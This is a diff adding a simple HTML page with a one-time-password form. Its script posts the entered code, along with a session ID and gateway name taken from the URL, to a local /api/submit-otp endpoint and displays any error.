@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enter OTP</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="card">
+    <h1>Enter OTP</h1>
+    <p class="subtitle">Your bank sent a one-time password to your registered mobile number.</p>
+    <form id="otpForm">
+      <label for="otp">One-Time Password</label>
+      <input type="text" id="otp" name="otp" inputmode="numeric" placeholder="123456" required>
+      <button type="submit">Submit OTP</button>
+      <div class="error" id="errorBox"></div>
+    </form>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const sessionId = params.get('sessionId');
+    const gateway = params.get('gateway');
+
+    document.getElementById('otpForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const otp = document.getElementById('otp').value.trim();
+      try {
+        const res = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, gateway, otp }),
+        });
+        const data = await res.json();
+        if (!res.ok || data.error) {
+          document.getElementById('errorBox').textContent = data.error || 'Could not submit OTP.';
+          document.getElementById('errorBox').classList.add('visible');
+        }
+      } catch (err) {
+        document.getElementById('errorBox').textContent = 'Network error.';
+        document.getElementById('errorBox').classList.add('visible');
+      }
+    });
+  </script>
+</body>
+</html>
